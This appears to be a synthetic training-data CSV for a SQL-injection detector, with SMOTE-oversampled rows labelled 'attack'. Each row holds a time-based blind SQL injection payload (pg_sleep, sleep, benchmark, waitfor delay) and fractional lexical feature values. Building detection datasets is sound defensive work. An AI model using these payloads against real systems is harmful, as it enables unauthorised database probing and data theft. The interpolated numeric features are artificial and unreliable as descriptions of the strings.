id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001538,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000095,1.07588582729795,87.65422153039093,27.60903692173182,3.6488989050773357,24.60903692173182,18.0,35.436147686927285,9.609036921731821,0.28088065935133477,0.20558518683240257,0.40397448349193005,0.10955967032433261,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.609036921731822,0.0,1.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.609036921731822,0.390963078268178,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001539,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000009,0.5383619082236129,92.76436996075594,22.218391417358838,3.268472176167695,35.563217165282325,1.9827613781147733,42.32758712603826,12.890804291320581,0.3838711748593281,0.020712524904018786,0.45630593733462566,0.13911036290202747,2.7816085826411623,0.0,0.0,0.0,1.0,1.0,0.0,8.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.109195708679419,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.10919570867941902,1.0,0.8908042913205809,0.10919570867941897,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.109195708679419
SMOTE_001540,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,0.017677956175871153,60.935664742397236,17.025734103041103,2.9520797642698127,22.0,1.0,28.94853179391779,8.987132948479449,0.3610700748440459,0.016412276129274816,0.4750369326403587,0.1474807163863206,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.987132948479448,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001541,attack,time,"1'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000126,0.07413698751192127,73.85897200552606,27.035256998618486,3.7049628394660195,16.0,21.0,27.858972005526052,9.0,0.21665182392115506,0.284355518896516,0.37712600622667924,0.12186665095564972,1.0,0.0,0.0,0.0,0.0,1.0,0.0,4.964743001381513,0.03525699861848708,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001542,attack,time,"1""  )   where 7165  =  7165 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000015,0.7938596121759438,92.95788913820002,28.0,3.8098486153029136,20.347370287266664,28.652629712733344,33.30525942546668,10.652629712733338,0.21923295747570914,0.3082166837511041,0.3580906860849936,0.11445967268819314,0.0,1.0,1.6526297127333383,0.0,0.0,2.0,0.0,4.826314856366669,0.0,0.0,1.0,3.6526297127333383,0.0,1.0,0.8263148563666691,0.17368514363333085,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001543,attack,time,1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',nearest_attack_euclidean,R000088,0.817908198806048,73.48482213095348,24.316802011904862,3.6044208107099194,22.633604023809724,11.267208047619444,28.267208047619444,11.316802011904862,0.3092680426685876,0.15121992888568733,0.3848780071114313,0.1546340213342938,3.841598994047569,0.0,0.0,0.0,0.0,1.1584010059524306,0.0,4.158401005952431,0.0,0.0,0.15840100595243062,3.0,1.0,0.0,0.0,0.15840100595243056,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.15840100595243067,0.8415989940475693,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001544,attack,time,1   )    )    as beld where 1679  =  1679 or sleep  (  5  )  #,nearest_attack_euclidean,R000133,0.9586266755531514,62.19067680606677,20.427969581799694,3.162391566816916,16.474585551465847,10.0,29.144060836400616,6.572030418200308,0.2652309579318179,0.1608021587146268,0.46840574021683784,0.10556114313671747,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.381353612133538,0.0,0.0,0.19067680606676918,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8093231939332307,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.809323193933231
SMOTE_001545,attack,time,"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'fele'  =  'fele",nearest_attack_euclidean,R000042,0.14312903395344492,95.30193882562881,21.88977981457297,2.930201333810979,20.88977981457297,9.706079505527923,49.77955962914594,14.926519876381981,0.21930169735670996,0.10129386421460937,0.522692205508194,0.15671223292048672,4.0,0.0,0.0,0.0,0.0,1.96325993819099,0.0,8.0,0.0,0.0,0.9632599381909903,1.9632599381909903,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001546,attack,time,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',nearest_attack_euclidean,R000007,1.7154726482190437,93.25815497084191,22.629077485420957,3.2270497806309635,32.854612572895206,1.629077485420959,43.88723245626288,14.887232456262877,0.3526053165767865,0.01741639381219777,0.47048830679935527,0.15948998281166046,3.6290774854209586,0.0,0.0,0.0,1.0,1.0,0.0,8.0,1.258154970841918,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.6290774854209589,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.629077485420959
SMOTE_001547,attack,time,1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000150,0.261470473304514,65.27048609210367,22.360648122804886,3.375855278295352,19.360648122804886,10.0,28.909837969298778,7.0,0.29644861815211493,0.15323419436175642,0.4430532514328992,0.1072639360532295,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.909837969298779,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.09016203070122106,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001548,attack,time,select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,nearest_attack_euclidean,R000049,0.0,59.0,19.0,3.2663537739235613,24.0,1.0,25.0,9.0,0.4067796610169492,0.016949152542372878,0.423728813559322,0.15254237288135594,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001549,attack,time,"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",nearest_attack_euclidean,R000096,1.0635303171909951,86.92284597063275,19.13183513866182,2.9272788960721465,14.0,18.0,44.79101083197092,10.13183513866182,0.16211789252907874,0.2084372903945298,0.5130559015709348,0.11638891550545653,0.0,0.0,0.0,0.0,0.0,2.0,0.0,7.13183513866182,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001550,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  '%'  =  ',nearest_attack_euclidean,R000028,1.0347316082032325,90.73321877198707,22.183304692996767,3.0334372793380378,28.5499140789903,1.1833046929967672,45.81669530700323,15.183304692996767,0.314534532091429,0.01297449215103097,0.5051742924490408,0.16731668330849916,2.4500859210096966,0.7332187719870704,0.0,0.0,1.0,1.0,0.0,8.816695307003233,1.1833046929967677,0.0,0.0,2.0,0.8166953070032322,0.1833046929967676,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.1833046929967677,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.183304692996768
SMOTE_001551,attack,time,"1 where 7196  =  7196 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000044,0.9808008105947916,88.4491328226741,27.449132822674105,3.8535330487353345,20.0,29.0,30.0,9.449132822674105,0.2261258099523133,0.32788242443085436,0.33918871492846997,0.1068030506883624,0.44913282267410515,0.0,2.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,4.0,0.4491328226741051,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001552,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt,nearest_attack_euclidean,R000120,0.06928091284928657,94.68245683111024,28.964717425678916,3.681102917782382,33.87063056082269,10.0,38.87063056082269,11.94119570946486,0.35766352492575965,0.10575471078775503,0.4105408803196372,0.12604088396684812,3.952956567571888,0.0,0.0,0.0,0.0,1.0,0.0,5.976478283785944,0.0,1.0,0.0,1.0,0.988239141892972,0.0,0.0,0.011760858107027983,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.988239141892972,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.988239141892972
SMOTE_001553,attack,time,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '",nearest_attack_euclidean,R000074,0.7292046036357708,66.72911746815669,19.81264759552993,3.228645454913781,13.72911746815669,10.0,30.0,13.0,0.20570855400549626,0.1498663105650007,0.4495989316950021,0.1948262037345009,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,2.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7291174681566894,0.27088253184331046,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001554,attack,time,"1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000155,0.7501734287499876,74.0,25.457488532735976,3.627643030374356,16.771255733632014,19.457488532735976,28.0,9.771255733632012,0.2266385909950272,0.2629390342261618,0.3783783783783784,0.1320439964004326,1.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.7712557336320125,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.2287442663679875,0.7712557336320125,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001555,attack,time,"1'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000154,1.263433038761449,65.8414208721058,18.702958633721842,2.8204502528380466,10.702958633721844,10.0,35.029586337218426,10.108875901165527,0.16350802927738908,0.15346576308136278,0.5301267985880789,0.15289940905316918,1.0,0.0,0.0,0.0,0.0,1.0,0.0,6.405917267443685,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.7029586337218423,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7029586337218424,0.2970413662781577,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001556,attack,time,1' where 7725  =  7725 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000111,0.34024288364357996,98.84378603716861,23.84378603716861,3.2888592856313603,32.0,10.0,45.0,11.84378603716861,0.3237475620295408,0.1011711131342315,0.4552700091040417,0.11981131573218606,0.84378603716861,0.0,0.0,0.0,1.0,1.0,0.0,8.0,0.0,0.0,0.0,2.0,0.84378603716861,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_001557,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000084,0.42796760992220245,58.10583074779926,20.67062693915055,3.5262132811856635,23.0,3.2235423130501832,20.88228843474908,11.0,0.39616822582453526,0.055738522103717436,0.35862149189479564,0.18947176017695166,5.223542313050183,0.0,0.0,0.0,0.0,1.0,0.0,2.7764576869498154,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001558,attack,time,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,nearest_attack_euclidean,R000148,0.5288827281559719,77.62538415946355,23.0,3.411480032970865,26.62006146551417,4.0,33.290276594813754,13.715046099135627,0.3451635329399131,0.052158741673214964,0.4253031095463355,0.17737461584053643,6.0,0.0,0.0,0.0,0.0,0.09498463362145815,0.0,5.620061465514167,0.0,0.0,0.0,0.09498463362145815,1.0,0.0,0.0,0.0,0.0,0.09498463362145815,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001559,attack,time,"1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000064,0.408619476565504,92.51977939713416,26.311867638280493,3.6085071590016837,25.89604412057317,18.0,35.415823517707324,13.207911758853662,0.2800226125915781,0.19460376186145062,0.3826830440082226,0.14269058153874864,3.1039558794268314,0.0,0.0,0.0,0.0,2.0,0.0,5.103955879426831,0.0,0.0,1.0,3.1039558794268314,1.0,0.0,0.0,0.8960441205731687,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.8960441205731687,0.10395587942683127,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001560,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000050,0.77835277967546,70.95933243506678,23.780500673699912,3.5629821704752294,16.739833108766696,19.520333782466608,26.959332435066784,7.739833108766696,0.2358985564614107,0.27557939462241154,0.37953648430207076,0.108985564614107,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.739833108766696,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.2601668912333042,0.7398331087666958,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001561,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy'  =  'hwjy,nearest_attack_euclidean,R000047,1.0033693750165116,75.28539366255816,19.01797737654069,2.8003458948723483,19.67865158436046,2.0,41.285393662558164,12.321348415639541,0.2627311985332437,0.026635386936791877,0.547198422074538,0.16343499245542636,4.0,0.0,0.0,0.0,0.0,1.0,0.0,7.32134841563954,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.66067420781977,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.66067420781977
SMOTE_001562,attack,time,"1'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000154,1.049773492913424,74.75663652722648,19.206810283792457,2.7921666528139064,11.620430851377366,11.65448227033964,40.48172340550946,11.0,0.1557768291546735,0.15334061346413366,0.5417770277036953,0.14910552967749752,0.7931897162075449,0.0,0.0,0.0,0.0,1.206810283792455,0.0,7.206810283792455,0.0,0.0,1.0,1.2068102837924553,0.7931897162075447,0.0,0.0,0.793189716207545,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2068102837924553,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2068102837924553
SMOTE_001563,attack,time,"1%' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '%'  =  '",nearest_attack_euclidean,R000058,0.7005090054366524,81.0391227118266,26.019561355913297,3.6955429112755587,17.50978067795665,20.529342033869945,30.0,13.0,0.21589778591216024,0.25086759380525453,0.37202415368552455,0.16121046659706065,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,2.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.8774451694891622,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.12255483051083782,0.8774451694891623,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001564,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000036,0.9051487682429333,69.28865449647172,24.71134550352828,3.626833527050994,22.71134550352828,10.0,27.0,9.577308992943443,0.32783515244815764,0.14432990787479974,0.38969075126195934,0.13814418841508325,2.5773089929434443,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.7113455035282779,0.28865449647172214,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001565,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000104,0.8112455161795971,79.50046414193041,22.25032489935128,3.099984113744167,28.7502320709652,1.75004641419304,38.250139242579124,10.75004641419304,0.36119666422107627,0.021765392560970265,0.48170618501968193,0.1353317581982715,0.7500464141930401,0.0,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0,0.7500464141930402,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001566,attack,time,"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000046,0.9141765505668757,71.3546355333835,28.0,3.834930262211424,16.0,21.0,25.083708426706796,9.2709271066767,0.22444301551730744,0.29458145786646606,0.3511139689653851,0.12986155765084142,0.7290728933233005,0.2709271066766994,0.0,0.0,0.0,1.0,0.0,4.2709271066767,1.0,0.0,1.0,1.0,0.7290728933233006,0.27092710667669945,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001567,attack,time,"1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000023,1.5274627278473156,67.31177026966985,19.53764594606603,2.8587055758713937,10.462354053933971,10.0,35.849416215735886,11.0,0.1553703979800021,0.14876534006665965,0.5322223878800126,0.16364187407332562,1.0,0.0,0.0,0.0,0.0,1.0,0.0,6.462354053933971,0.5376459460660289,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4623540539339711,0.5376459460660289,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001568,attack,time,"1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000023,0.9469060276549278,62.65013333221188,19.477807407158195,2.9406535258984072,10.0,10.0,32.433422221474586,10.216711110737293,0.16030183150491242,0.16030183150491242,0.5170516239287484,0.16234471306142675,1.0,0.0,0.0,0.0,0.0,1.0,0.0,5.738903703579098,0.7389037035790975,0.0,1.0,1.0,1.0,0.0,0.0,0.7389037035790977,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001569,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000041,0.013761748936600024,68.98126991871811,25.985952439038588,3.6641568748338478,22.981269918718116,10.0,27.995317479679528,8.00468252032047,0.3331412299355704,0.14496929784009338,0.40584199517810043,0.1160474770462358,0.0,0.004682520320470784,2.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,3.0,0.0,0.004682520320470784,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
